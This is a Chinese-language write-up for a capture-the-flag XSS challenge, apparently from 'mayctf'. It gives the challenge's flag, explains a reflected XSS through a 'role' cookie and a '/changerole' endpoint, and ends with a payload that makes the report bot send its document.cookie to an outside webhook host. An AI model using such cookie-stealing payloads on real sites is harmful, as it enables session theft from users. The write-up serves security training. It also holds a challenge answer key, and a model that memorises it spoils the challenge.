# Description
有小黑子???速速请求律师发送律师函

# Difficulty
⭐⭐⭐⭐

# Flag
`mayctf{St4rt_Y0ur_XSS_j0urn3y}`

# Platform (Optional)
ARCH

# Hint (Optional)
XSS

# WriteUp
## 后端api
 - `/`
 - `/changerole` 
 - `/report`

## 前端xss
访问 `/` 时会设置`cookie: role=ikun`，role的值会原样显示在前端，因此可以通过设置`role`的值来触发反射型xss

但是，要注意这里的xss受害只是你当前的浏览器，即你所发送的恶意js脚本是由你的浏览器执行，此时只能达到我打我自己的效果

## 攻击xssbot
本题的xssbot为`/report`接口，它相当于受你控制的一个浏览器，会访问你给出的链接，那这应该怎么利用？

这时我们就需要用到另一个接口`/changerole`，这个接口可以通过`GET`型参数来设置cookie。这时我们就可以通过设置带有xsspayload的`newrole`参数来攻击`/report`这个浏览器，通过xsspayload将`/report`浏览器的cookie作为参数值发送到你的服务器，或者一些可以用来接受外带信息的公用服务器，这里使用`https://webhook`

## exp
```js
url=http://127.0.0.1:9988/changerole?newrole=<script>location=`https://webhook/?f=`+encodeURIComponent(document.cookie)</script>
```
